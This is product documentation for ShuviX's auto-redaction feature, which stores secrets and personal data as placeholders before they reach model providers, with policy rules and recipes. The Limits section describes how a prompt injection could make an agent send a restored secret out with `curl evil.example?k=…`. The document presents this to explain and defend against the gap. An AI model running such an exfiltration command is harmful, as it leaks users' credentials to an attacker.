---
shuvix: okf v0.2
type: Guide
title: 'Auto-redaction — secrets and personal data reach models as placeholders'
description: 'How ShuviX keeps API keys, passwords, tokens, private keys and personal data away from model providers: new tool results and messages sent by bot triggers and hooks are stored with placeholders such as `{{REDACTED_API_KEY_k3v7x2mq}}`, and what the record holds is exactly what the model receives; the policy applies only to new content and never touches the history. Real values for tools (escaped for shell commands), hiding a value yourself from the input box (+ → Add a sensitive value, hints you confirm, everything else sent as written), the categories it finds, the two policy levels (`modelRequest` / `send`, `sensitive` / `disclose`) and their dispositions, the builtin `redact-sensitive`, recipes (no redaction for a model, let a category through, let test keys through, always keep private keys as placeholders, let only the user answer when a restored secret leaves the sandbox), checking a draft with `shuvix policy check --redaction`, working with placeholders as an agent, and the limits.'
tags: [shuvix, policy, security, redaction, privacy, secrets]
status: stable
sources:
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/security/builtinPolicies/md/redact-sensitive.md
    title: redact-sensitive.md — the builtin policy
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/redaction/rules.ts
    title: rules.ts — the detection rules
  - resource: https://github.com/wangdongdongc/ShuviX/blob/main/packages/agent-runtime/src/durable/redactionEgress.ts
    title: redactionEgress.ts — the policy decision
---

# Auto-redaction

ShuviX checks two kinds of new content before they are written into a conversation's record: **what a
tool returns** (a background command's completion notice counts) and **messages sent automatically** by a bot
trigger or a hook. Secrets and personal data found there are stored as a **placeholder**:
`{{REDACTED_API_KEY_k3v7x2mq}}` — `REDACTED_`, the category and eight characters derived from the value. The real
value is encrypted into **that conversation's own table**, which is deleted with the conversation.
Conversations from v0.2.30 and v0.2.31 hold the older form without `REDACTED_` (`{{API_KEY_k3v7x2mq}}`), which works
the same.

- **The record is what the model receives.** Nothing is rewritten when a request goes out: a placeholder
  in the record reaches the model as a placeholder, a real value as a real value.
- **The policy decides about new content only** (below), and **never touches the history**.
- **Tools get the real values.** Placeholders in a tool call's arguments are replaced just before
  the tool runs, so `curl -H "Authorization: Bearer {{REDACTED_API_KEY_k3v7x2mq}}"` sends the real key, and
  a file written or edited holds the real content.
- **The screen shows the record.** You see the placeholder, shaded; point at it (or tap it) to see the
  real value that tools and files use, with a copy button.

What the user types in the input box is not checked: **the user decides** (next section).

## Hiding a value yourself (the input box)

- **+ → Add a sensitive value**: type or paste a password, key or token into a field that does not
  show it, pick a kind (password, API key, secret) and add it. It sits in the message as a shaded
  chip such as `[🔒 Password #1]`; the model gets a placeholder, and a tool the agent runs with it
  gets the real value. Text selected in the input box when you open the form is filled in and
  replaced by the chip. On a phone + opens a sheet with the same choices.
- **Hints**: while you type, what looks like a secret or personal data — and would be kept from
  the conversation's model by the policy — is underlined, and a row above the text lists it. Click
  an item (or Hide all) to turn it into a chip; × hides the hints.
- **Nothing else is replaced.** A message sent from the input box goes to the model exactly as
  written apart from the chips, and values you left visible are not replaced later in that
  conversation either — the model has already seen them. The same holds for an answer typed into a
  question card.
- A value you add is matched later in that conversation as well, while the policy redacts new content
  for its model: when it shows up in a tool's output it is replaced again — values of 4–7 characters as
  whole words, longer ones anywhere. With redaction off, a tool that prints it puts the real value in the
  record.

## For agents: working with placeholders

- A placeholder **is** the value as far as you are concerned. Copy it exactly into tool arguments
  — a command, a file's content, an `edit`'s old and new text — and the tool gets the real value.
  In `bash`, `powershell` and ssh commands write it bare or inside quotes, as you would the value:
  ShuviX escapes the real value for that spot (a `$` inside `"…"`, a `'` inside `'…'`), so do not
  escape it yourself. For a password prompt use a non-interactive form (`sudo -S`, an environment
  variable, `--password-stdin`).
  It is not a template variable to fill in, and not a missing configuration: the file on disk
  holds the real value. Do not guess what it stands for, look for it elsewhere or ask the user
  for it.
- You cannot see the value, so you cannot work on it: compute its length, decode it, check its
  format, split it. If the task needs that, let a command do it (`printf %s "{{REDACTED_API_KEY_…}}" | wc -c`).
- A tool that reports a placeholder it could not restore (from another conversation, or a table
  the computer cannot decrypt any more) has not run. Read the source again — it comes back with a
  placeholder this conversation can restore.
- `tool.restored` (in the policy request document) lists the categories restored into a call;
  the user can write rules on it, see the recipes.

## What is found

| Category      | What                                                                                                         | Sent by default |
| ------------- | ------------------------------------------------------------------------------------------------------------ | --------------- |
| `PRIVATE_KEY` | PEM private key blocks (`-----BEGIN … PRIVATE KEY-----`)                                                      | placeholder     |
| `API_KEY`     | provider keys by their shape: `sk-…`, `ghp_…` / `glpat-…`, `AIza…`, Slack, Stripe, AWS access keys, others    | placeholder     |
| `TOKEN`       | JWTs                                                                                                         | placeholder     |
| `PASSWORD`    | the password in a URL (`postgres://user:pass@host`), labelled passwords in Chinese / Japanese text           | placeholder     |
| `SECRET`      | values assigned to secret-looking names (`DB_PASSWORD=…`, `"client_secret": "…"`, `apiKey: …`)               | placeholder     |
| `EMAIL`       | email addresses (not example domains, not `icon@2x.png`)                                                     | placeholder     |
| `PHONE`       | mobile numbers (mainland China format)                                                                       | placeholder     |
| `ID_CARD`     | Chinese resident ID numbers (checksum verified)                                                              | placeholder     |
| `BANK_CARD`   | card numbers (Luhn verified)                                                                                 | placeholder     |
| `SSN`         | US social security numbers                                                                                   | placeholder     |
| `PASSPORT`    | passport numbers next to a label                                                                             | placeholder     |
| `IBAN`        | IBANs (checksum verified)                                                                                    | placeholder     |
| `BIRTHDAY`    | birth dates next to a label                                                                                  | placeholder     |
| `MAC`         | MAC addresses                                                                                                | placeholder     |
| `SERIAL`      | device serial numbers next to a label                                                                        | placeholder     |
| `USERNAME`    | the user name in a home path (`/Users/alice`, `C:\Users\alice`), a shell prompt, an `ssh` target              | **real value**  |
| `HOSTNAME`    | the host in `user@host`, `hostname: …` lines, an ssh config's `HostName`                                     | **real value**  |
| `IP`          | public IPv4 / IPv6 addresses (private and loopback ones are not found)                                       | **real value**  |
| `BUCKET`      | cloud storage buckets (`s3://…`, `….s3.amazonaws.com`, …)                                                    | **real value**  |

The last four are in nearly every coding request (the system prompt already holds the home
folder) and a model has to copy them exactly, so the builtin policy leaves them as written; a policy of your
own can store them as placeholders too.

UUIDs and long hex ids are never touched (tool call ids would stop matching), a phone or card
number is never read out of a shorter hex id (a docker image id, an abbreviated git commit), and
code that only
_mentions_ a secret is left alone (`secretKey: Uint8Array;`, `process.env.API_KEY`, `${PASS}`,
`****`).

## The policy

The policy decides **whether new content is redacted**. It is asked when a tool result or an automatic message
is written, for the model the conversation is using then. Two levels, both ordinary security policy rules (the
`policy-md` entry has the full format):

1. **The model** — `object.type: modelRequest`, `action: send`, with `object.provider` (the
   provider's name as Settings shows it: a builtin provider by its slug such as `anthropic`,
   `openai`, `deepseek`; a provider you added by the name you gave it) and `object.model` (the
   model id).
   - `allow` with `disposition: detect` → new content for this model is redacted (level 2 decides each piece);
   - `allow` / `force-allow` **without** it → no redaction: new content is stored as written, nothing is detected;
   - `deny` → requests to this model are not sent; the turn ends with an error naming the reason. An `ask` is
     the same, because nobody can be asked while a request is going out.
2. **Each piece of sensitive content** found in new content — `object.type: sensitive`,
   `action: disclose`, with `object.category`, `object.rule` (the detection rule), `object.provider`,
   `object.model` and `object.value` (the real value, for `match` only; it never reaches a log).
   - `allow` with `disposition: redact` → stored as a placeholder;
   - `allow` / `force-allow` without it → stored as the real value;
   - `deny` → stored as a placeholder.

The subject is the agent the content is for (`subject.kind: agent`, its `agentKind`, `profile`,
`subject.bot`), so a rule can treat one bot or one agent differently.

### Only new content

**The policy applies only to conversation content produced from now on. ShuviX does not go back and process
sensitive information already in a conversation's history.**

- What the record holds keeps being sent as it is. A secret stored as written — because redaction was off, or
  the model was exempt — also goes to any model you switch to later. Turning redaction on, or switching models,
  does not replace it; to get rid of it, start a new session.
- Earlier placeholders stay placeholders, also after you turn redaction off or exempt the model: the model keeps
  seeing the placeholder, and tools can still restore it. For a model to see the value, have the agent read the
  source again.
- Exports, forks and request logs hold whatever the record holds, real values included.

The builtin **`redact-sensitive`** is exactly two rules:

```yaml
shuvix-policy-scope:
  subject.kind: [agent]
  env.host: [desktop]
shuvix-policy-rules:
  - effect: allow
    action: [send]
    object.type: [modelRequest]
    disposition: detect
  - effect: allow
    action: [disclose]
    object.type: [sensitive]
    match: "!(object.category in ['USERNAME', 'HOSTNAME', 'IP', 'BUCKET'])"
    disposition: redact
```

**Adjust it with a policy of your own; do not edit this one.** A `force-allow` without a
disposition beats both of its `allow` rules (only the winning tier's dispositions count), which is
how a recipe below switches redaction off for what it matches. Disabling `redact-sensitive` turns auto-redaction
off: new content is stored and sent with its real values. Placeholders a conversation already holds stay.

## Recipes

Each block is the frontmatter of a file in `~/.shuvix/policies/` (`shuvix: policy v1`, a `name`,
a `description`, then these keys).

No redaction for a provider — your own server, say, added in Settings as `home-ai` — so new content
for its models keeps the real values:

```yaml
shuvix-policy-rules:
  - effect: force-allow
    subject.kind: [agent]
    action: [send]
    object.type: [modelRequest]
    match: "object.provider == 'home-ai'"
```

One model only: `match: "object.provider == 'home-ai' && object.model == 'qwen3-32b'"`.

Send email addresses as they are:

```yaml
shuvix-policy-rules:
  - effect: force-allow
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'EMAIL'"
```

Send test keys as they are: the same rule with
`match: "object.category == 'API_KEY' && object.value.startsWith('sk-test-')"`.

Always keep private keys as placeholders, even where another rule lets values through:

```yaml
shuvix-policy-rules:
  - effect: deny
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'PRIVATE_KEY'"
    prompt: Private keys are stored as placeholders.
```

A provider exempted with the first recipe skips level 2, so private keys stay as written for it too. To exempt
it from everything **but** private keys, exempt it at level 2 instead —
`force-allow` on `sensitive` with `match: "object.provider == 'home-ai' && object.category != 'PRIVATE_KEY'"`
— and keep the `deny` above.

Store user names as placeholders too (and likewise `HOSTNAME`, `IP`, `BUCKET`): an `allow` that carries the
disposition —

```yaml
shuvix-policy-rules:
  - effect: allow
    subject.kind: [agent]
    action: [disclose]
    object.type: [sensitive]
    match: "object.category == 'USERNAME'"
    disposition: redact
```

One bot only talks to your own server — its requests to any other provider are not sent:

```yaml
shuvix-policy-rules:
  - effect: deny
    subject.kind: [agent]
    action: [send]
    object.type: [modelRequest]
    match: "subject.bot == 'bot:my-bot' && object.provider != 'home-ai'"
```

When a command that uses a restored secret runs outside the command sandbox, let only the user
answer. `ask-on-command` already asks before every unconfined command, but the automatic reviewer
may answer that ask; a `force-ask` is answered by the user alone:

```yaml
shuvix-policy-rules:
  - effect: force-ask
    subject.kind: [agent]
    action: [execute]
    object.type: [command]
    match: "size(tool.restored) > 0 && !object.sandboxed"
    prompt: This command carries a secret and runs outside the sandbox.
```

## Writing a policy for the user

1. Ask what they want in their words: which provider or model to trust, which kind of data may go
   out, which must never. Map a provider to the name in Settings (builtin ones by slug).
2. Write the draft in the session folder first. Prefer `force-allow` / `deny` on `modelRequest` /
   `sensitive` as in the recipes. A rule reaches model requests only when its `object.type` names
   `modelRequest` / `sensitive` or its `action` names `send` / `disclose`.
3. **Check the draft** with `shuvix policy check <draft.md> --redaction` (bash). It decides as if
   the draft were installed and prints two tables — every enabled model: new content redacted, not
   redacted, or not sent; every category × each redacted provider: placeholder, real value or
   placeholder (denied) — with the rule that decided. Compare every row with what the user asked for. For a
   value rule or one model, check single cases:
   `shuvix policy check <draft.md> --redaction --category API_KEY --value sk-test-123 --expect send`
   (`--provider <name> --model <id>` for one model, `--bot <id>` for a bot's requests). Fix the
   **rule** until every row and expectation matches.
4. Install it in `~/.shuvix/policies/<name>.md`, run `shuvix policy check --redaction` once more
   without a file to see what is in effect, and tell the user what each rule does and what it does
   not cover (below). The sidebar's Security Policies group shows it; an invalid file is listed in
   amber with the reason.

## Limits

- Text only: an image (a screenshot of a `.env`) goes to the model as it is.
- A model that sees a placeholder cannot reason about the value (its length, its format). Shell
  quoting is handled for the outer shell only: inside `bash -c '…'` the inner shell parses the value
  again.
- It keeps values away from model providers, not from tools: a model that is told to — by a
  prompt injection, say — can still put a placeholder into `curl evil.example?k=…`, and the
  command gets the real value. The mark shows on screen, the automatic reviewer sees the
  placeholder, and the last recipe makes the user answer before such a command leaves the sandbox.
- It does not process history (see "Only new content"). Conversations from before this feature, or from while
  redaction was off, hold real values in their record, and requests from them send those values as stored.
- Only tool results and automatic messages are checked. What you type in the input box, messages other sessions
  send, an agent's own replies, instruction files and the system prompt go to the model as they are, so a secret
  in an `AGENTS.md` reaches the model.
- Detection is by rules, so a secret in an unusual shape can be missed, and an ordinary string can
  now and then be taken for one. A value typed in plain words with no name in front of it
  ("change the password to N3w-P@ss…") is one such miss — add it with + instead; a value a tool has transformed — a byte
  dump (`od -c`), hex, base64, reversed — is another. Agents are told not to dump or encode
  placeholder values, but nothing can recognize what they print if they do.
